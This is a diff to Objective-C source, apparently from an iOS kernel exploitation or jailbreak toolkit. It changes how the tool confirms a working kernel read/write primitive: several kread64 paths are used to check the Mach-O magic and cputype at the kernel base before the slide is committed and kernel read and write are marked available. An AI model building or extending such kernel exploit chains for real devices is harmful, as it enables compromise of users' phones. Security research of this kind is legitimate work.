@@ -360,25 +360,42 @@ static inline void boardSet(NSMutableDictionary *d, NSString *key, id val) {
             }
         }
 
-        // Live kread of kbase+0x1c must look like a kernel VA (pointer, not Darwin version text).
-        uint64_t version_ptr = kbase + 0x1c;
-        uint64_t version_str;
-        /* Lane cascade (2026-10-14 rig): P044/ANE254 stamp board.krwContext
-           with placeholder contexts; a dead SocketKRW ctx must not block a
-           live ClearSword core lane. The kread result decides, not the flag. */
+        /* Honest self-test (upstream ClearSword identification criteria).
+           kbase must read as a Mach-O 64 kernel header: magic+cputype
+           0x100000cfeedfacf at kbase, and the kbase+8 typeinfo must be one
+           of the xnu kernel values (0x200000000 arm64, 0xc00000002 arm64e
+           iOS16+, 0xcc0000002 arm64e iOS19+). The old kbase+0x1c "kernel
+           VA" gate was unfalsifiable: that offset is Mach-header
+           reserved | first LC cmd, never a pointer (three rig boots all
+           returned 0x1b00000000 = header data). The magic walk inside the
+           ClearSword run already proved these two words in-window; this is
+           the same test done post-run through the kept-alive primitive. */
+        uint64_t magic64 = 0;
         if (_krwContext) {
-            version_str = Lum1naSocketKRW_kread64(_krwContext, version_ptr);
-        } else {
-            version_str = 0;
+            magic64 = Lum1naSocketKRW_kread64(_krwContext, kbase);
         }
-        if (version_str < 0xFFFFFF8000000000ULL && Lum1naLibkrw_IsLive()) {
-            version_str = Lum1naLibkrw_KRead64(version_ptr);
+        if (magic64 != 0x100000CFEEDFACFULL && Lum1naLibkrw_IsLive()) {
+            magic64 = Lum1naLibkrw_KRead64(kbase);
         }
-        if (version_str < 0xFFFFFF8000000000ULL && Lum1naCS2Core_IsLive()) {
-            version_str = Lum1naCS2Core_KRead64(version_ptr);
+        if (magic64 != 0x100000CFEEDFACFULL && Lum1naCS2Core_IsLive()) {
+            magic64 = Lum1naCS2Core_KRead64(kbase);
         }
-        if (version_str < 0xFFFFFF8000000000ULL) {
-            P06xLogF(@"board", @"commitSlide FAIL kread kbase+0x1c=0x%llx (not a kernel VA)", version_str);
+        if (magic64 != 0x100000CFEEDFACFULL) {
+            P06xLogF(@"board", @"commitSlide FAIL kread kbase=0x%llx (no Mach-O magic+cputype)", magic64);
+            return NO;
+        }
+        uint64_t typeinfo = 0;
+        if (_krwContext) {
+            typeinfo = Lum1naSocketKRW_kread64(_krwContext, kbase + 8);
+        }
+        if (typeinfo != 0x200000000ULL && typeinfo != 0xc00000002ULL && typeinfo != 0xcc0000002ULL && Lum1naLibkrw_IsLive()) {
+            typeinfo = Lum1naLibkrw_KRead64(kbase + 8);
+        }
+        if (typeinfo != 0x200000000ULL && typeinfo != 0xc00000002ULL && typeinfo != 0xcc0000002ULL && Lum1naCS2Core_IsLive()) {
+            typeinfo = Lum1naCS2Core_KRead64(kbase + 8);
+        }
+        if (typeinfo != 0x200000000ULL && typeinfo != 0xc00000002ULL && typeinfo != 0xcc0000002ULL) {
+            P06xLogF(@"board", @"commitSlide FAIL kread kbase+8=0x%llx (bad typeinfo)", typeinfo);
             return NO;
         }
 
@@ -387,7 +404,7 @@ static inline void boardSet(NSMutableDictionary *d, NSString *key, id val) {
         _hasKread = YES;
         _hasKwrite = YES;
 
-        P06xLogF(@"board", @"commitSlide OK kbase=0x%016llx kread(kbase+0x1c)=0x%llx", _kbase, version_str);
+        P06xLogF(@"board", @"commitSlide OK kbase=0x%016llx magic=0x%llx typeinfo=0x%llx", _kbase, magic64, typeinfo);
 
         _d[@"kslide"] = [NSString stringWithFormat:@"0x%llx", _kslide];
         _d[@"kbase"] = [NSString stringWithFormat:@"0x%llx", _kbase];
@@ -487,7 +504,7 @@ static inline void boardSet(NSMutableDictionary *d, NSString *key, id val) {
             (unsigned long long)kbase, mag];
         if (mag == MH_MAGIC_64_BOARD) {
             [out appendString:@"KREAD primitive reads MH_MAGIC_64 at staticBase.\n"];
-            [out appendString:@"commitSlide still needs the live slide (nonzero) plus kbase+0x1c kernel VA.\n"];
+            [out appendString:@"commitSlide still needs the live slide (nonzero) plus a kread of the kernel Mach-O header (magic+cputype, kbase+8 typeinfo).\n"];
         } else {
             [out appendString:@"KREAD FAIL — armed kread did not return MH_MAGIC_64 at staticBase.\n"];
         }
